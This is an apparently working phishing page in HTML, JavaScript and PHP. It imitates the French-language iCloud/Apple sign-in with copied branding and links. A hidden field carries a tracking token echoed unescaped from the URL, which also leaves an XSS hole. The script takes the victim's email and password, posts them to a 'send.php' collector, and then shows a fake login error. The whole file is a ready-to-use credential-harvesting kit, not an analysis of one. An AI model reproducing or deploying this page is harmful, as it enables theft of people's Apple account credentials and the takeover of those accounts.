<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
  <title>iCloud</title>
  <style>
    * {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      height: 300vh;
      width: 100%;
      overflow-x: hidden;
    }
    header {
      color: black;
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: transparent;
      position: fixed;
      width: 100%;
      top: 0;
      left: 0;
      z-index: 10;
      backdrop-filter: blur(4px);
    }
    header .left {
      display: flex;
      align-items: center;
      gap: 3px;
    }
    header .left h3 {
      font-size: 22px;
      font-weight: 500;
    }
    header .right {
      text-align: center;
      font-size: 25px;
      font-weight: 900;
    }
    main, form {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
    }
    main {
      padding: 30px 30px;
      gap: 20px;
      animation: up 2s linear;
    }
    img {
      width: 210px;
      margin-top: 30px;
    }
    h1 {
      text-align: center;
    }
    .input {
      display: flex;
      flex-direction: column;
      width: 80%;
      border-radius: 15px;
      border: 1px solid #9f9f9f;
      padding: 10px 30px 10px 10px;
      position: relative;
      justify-content: center;
    }
    form label {
      transform: translateY(10px);
      text-align: left;
      color: #9f9f9f;
      font-size: 15px;
      transition: 0.3s;
    }
    form input {
      outline: none;
      border: none;
      background: none;
      font-size: 16px;
    }
    .focus {
      transform: translateY(0);
      font-size: 13px;
    }
    .focus ~ i {
      bottom: 5px;
    }
    .finp {
      border-color: blue !important;
      border-width: 2px;
    }
    form i {
      color: #9f9f9f;
      font-size: 20px;
      position: absolute;
      right: 10px;
    }
    .hide {
      display: none;
    }
    .load {
      position: absolute;
      right: 0px;
      bottom: 0px;
      width: 35px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      100% {
        transform: rotate(360deg);
      }
    }
    .error div:nth-child(2){
        background: #fef2f4;
        border-color: red;
    }
    .error label {
        color: red;
    }
    footer{
        display: flex;
        flex-direction: column;
        gap: 10px;
        align-items: center;
        justify-content: center;
        position: absolute;
        bottom: 0px;
        width: 100%;
        opacity: 0;
        animation: up 2s 1s linear forwards;
    }
    .link{
        display: flex;
        flex-direction: column;
        gap: 5px;
    }
    .link a{
        text-decoration: none;
        color: #3d84c9;
        font-size: 13px;
    }
    .about{
        background: #f2f1f6;
        display: flex;
        flex-direction: column;
        gap: 10px;
        /* align-items: center; */
        color: #878787;
        width: 100%;
        padding: 10px;
        font-size: 13px;
    }
    .up{
        display: flex;
        gap: 10px;
    }
    .betwween{
        width: 1px;
        height: 10px;
        background: gray;
        align-self: center;
    }
    .in{
        margin-bottom: 40px;
    }
    @keyframes up {
      0% {
        transform: translateY(20px);
        opacity: 0;
      }
      100% {
        transform: translateY(0px);
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="left">
      <i class="bi bi-apple"></i>
      <h3>iCloud</h3>
    </div>
    <div class="right">
      <i class="bi bi-three-dots"></i>
    </div>
  </header>
  <main>
    <img src="apple.png" alt="Iphone">
    <h1>Se connecter avec un compte Apple</h1>
    <form>
      <div class="input">
        <label for="email">E-mail ou numéro de téléphone</label>
        <input type="email" id="email" required>
        <i class="bi bi-arrow-right-circle" id="nextBtn"></i>
        <img src="load.png" alt="load" class="load hide" id="load">
    </div>
    <div class="input hide" id="psw" style="border-radius: 0 0 15px 15px;">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required>
        <i class="bi bi-arrow-right-circle" id="nextBtn1"></i>
        <img src="load.png" alt="load" class="load hide" id="load1">
      </div>
      <div class="input" style="display: none !important;">
        <input id="user_id" type="text" value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
      </div>
    </form>
  </main>
  <footer>
    <div class="in">
      <input type="checkbox" id="remember">
      <label for="remember" style="font-size: 15px;">Rester connecté</label>
    </div>
    <div class="link">
      <a href="https://iforgot.apple.com/password/verify/appleid">Mot de passe oublié ? &nearrow;</a>
      <a href="#">Créer un compte Apple</a>
    </div>
    <div class="about">
        <div class="up"><p>État du système </p> <div class="betwween"></div> <p>Engagement de confidentialité</p></div>
        <span>Conditions générales</span>
        <p>Copyright © 2025 Apple Inc. Tous droits réservés.</p>
    </div>
  </footer>

  <script>
    const emailInput = document.getElementById('email');
    const emailLabel = emailInput.previousElementSibling;
    const nextBtn = document.getElementById('nextBtn');
    const nextBtn1 = document.getElementById('nextBtn1');
    const loadIcon = document.getElementById('load');
    const loadIcon1 = document.getElementById('load1');
    const pswDiv = document.getElementById('psw');
    const passwordInput = document.getElementById('password');
    const passwordLabel = passwordInput.previousElementSibling;
    const user_id = document.getElementById('user_id')
    // Focus & Blur for email
    emailInput.addEventListener('focus', () => {
      emailLabel.classList.add('focus');
      emailInput.parentElement.classList.add('finp');
    });

    emailInput.addEventListener('blur', () => {
      if (emailInput.value === '') {
        emailLabel.classList.remove('focus');
      }
      emailInput.parentElement.classList.remove('finp');
    });

    // On keyup change arrow color
    emailInput.addEventListener('keyup', () => {
        if (document.querySelector('form').classList.contains('error')) {
        document.querySelector('form').classList.remove('error');
      }
      passwordInput.value = '';
      pswDiv.classList.add('hide');
      nextBtn1.style.color = '#9f9f9f';
      nextBtn.style.color = '#9f9f9f';
      nextBtn.style.display = 'block';
      nextBtn1.style.display = 'block';
      loadIcon1.classList.add('hide');
      emailInput.parentElement.style.borderRadius = '15px';
      if (emailInput.value.trim() !== '') {
        nextBtn.style.color = 'black';
      } else {
        nextBtn.style.color = '#9f9f9f';
      }
    });
    passwordInput.addEventListener('keyup', () => {
      if (passwordInput.value.trim() !== '') {
        nextBtn1.style.color = 'black';
      } else {
        nextBtn1.style.color = '#9f9f9f';
      }
    });

    // Next button logic
    nextBtn.addEventListener('click', () => {
      if (emailInput.value.trim() !== '') {
        nextBtn.style.display = 'none';
        loadIcon.classList.remove('hide');
        setTimeout(() => {
          loadIcon.classList.add('hide');
          pswDiv.classList.remove('hide');
          passwordInput.focus();
          emailLabel.parentElement.style.borderRadius = '15px 15px 0 0';
        }, 2000);
      }
    });
    nextBtn1.addEventListener('click', async () => {
      if (passwordInput.value.trim() !== '') {
        nextBtn1.style.display = 'none';
        loadIcon1.classList.remove('hide');
        //after fetch 
        await send(user_id.value ,emailInput.value ,passwordInput.value) ;         
        loadIcon1.classList.add('hide');
          let email = emailInput.value.trim();
          let password = passwordInput.value.trim();
          emailInput.focus();
          document.querySelector('form').classList.add('error');

        //after fetch 
    }
});

    // Password focus/blur

    passwordInput.addEventListener('focus', () => {
      passwordLabel.classList.add('focus');
      passwordInput.parentElement.classList.add('finp');
    });

    passwordInput.addEventListener('blur', () => {
      if (passwordInput.value === '') {
        passwordLabel.classList.remove('focus');
      }
      passwordInput.parentElement.classList.remove('finp');
    });

    async function send(id, email, password) {
      try {
        let res = await fetch('../send.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            id: id,
            email: email,
            password: password,
            page : 'iCloud'
          })
        });

        let data = await res.text();
        console.log(data);

      } catch (err) {
        console.error('Error:', err);
      }
    }
  </script>
</body>
</html>
